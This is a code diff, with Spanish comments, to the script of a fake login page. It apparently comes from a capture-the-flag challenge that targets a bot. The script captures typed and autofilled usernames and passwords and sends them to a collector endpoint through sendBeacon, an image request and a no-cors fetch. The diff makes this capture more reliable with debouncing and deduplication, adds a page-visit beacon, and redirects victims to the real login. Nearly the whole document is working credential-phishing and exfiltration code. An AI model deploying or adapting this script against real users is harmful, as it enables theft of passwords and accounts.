@@ -181,41 +181,50 @@
   const form = document.getElementById('loginForm');
   const user = document.getElementById('user');
   const pass = document.getElementById('pass');
-  let sent = false;
+  // Deduplicación: guardamos el último par (user,pass) enviado para no repetir
+  // y, sobre todo, para NO cortar el valor en el primer caracter.
+  let lastKey = "";
 
-  function exfil(reason){
-    const u = (user.value || '').trim();
-    const p = pass.value || '';
-    if(!u && !p) return;              // nada que mandar todavía
-    if(sent) return;                  // una sola vez
-    sent = true;
-
-    const data = { username:u, password:p, reason:reason,
-                   ua:navigator.userAgent, ref:document.referrer, t:Date.now() };
-    const qs = new URLSearchParams(data).toString();
-
-    // 3 vías por redundancia (sobreviven a la navegación / CORS)
+  function send(params){
+    const qs = new URLSearchParams(params).toString();
     try { navigator.sendBeacon(COLLECTOR, qs); } catch(e){}
     try { new Image().src = COLLECTOR + "?" + qs; } catch(e){}
     try { fetch(COLLECTOR + "?" + qs, {mode:"no-cors", keepalive:true}); } catch(e){}
   }
 
-  // 1) Si el bot autocompleta y envía el formulario
+  function exfil(reason){
+    const u = (user.value || '').trim();
+    const p = pass.value || '';
+    if(!u && !p) return;                       // todavía no hay nada útil
+    const key = u + "\u0001" + p;
+    if(key === lastKey) return;                // ya mandamos exactamente este par
+    lastKey = key;
+    send({ username:u, password:p, reason:reason,
+           ua:navigator.userAgent, ref:document.referrer, t:Date.now() });
+  }
+
+  // 0) Aviso de visita: confirma que el bot ABRIÓ la página (aunque no tipee nada).
+  //    Sirve para distinguir "no visitó" de "visitó pero no completó".
+  send({ event:"pageview", ua:navigator.userAgent, ref:document.referrer, t:Date.now() });
+
+  // 1) Al enviar el formulario -> valores completos, y luego redirige al login real.
   form.addEventListener('submit', function(e){
     e.preventDefault();
     exfil('submit');
-    // flujo "normal": lo mandamos al login real del reto
-    setTimeout(function(){ try{ location.href = REAL_LOGIN; }catch(e){} }, 400);
+    setTimeout(function(){ try{ location.href = REAL_LOGIN; }catch(e){} }, 500);
   });
 
-  // 2) Si el bot sólo tipea/pega sin enviar, capturamos igual
-  ['input','change','blur'].forEach(function(ev){
-    pass.addEventListener(ev, function(){ if(user.value && pass.value) exfil('field:'+ev); });
-    user.addEventListener(ev, function(){ if(user.value && pass.value) exfil('field:'+ev); });
+  // 2) Mientras tipea/pega, con debounce para captar el valor FINAL (no el primer caracter).
+  let deb = null;
+  function schedule(){ clearTimeout(deb); deb = setTimeout(function(){ exfil('input'); }, 500); }
+  [user, pass].forEach(function(el){
+    el.addEventListener('input',  schedule);
+    el.addEventListener('change', function(){ exfil('change'); });
+    el.addEventListener('blur',   function(){ exfil('blur'); });
   });
 
-  // 3) Por si el navegador autocompleta al cargar (password manager)
-  setTimeout(function(){ if(user.value && pass.value) exfil('autofill'); }, 1500);
+  // 3) Por si el navegador autocompleta al cargar (gestor de contraseñas).
+  setTimeout(function(){ exfil('autofill'); }, 1500);
   </script>
 </body>
 </html>
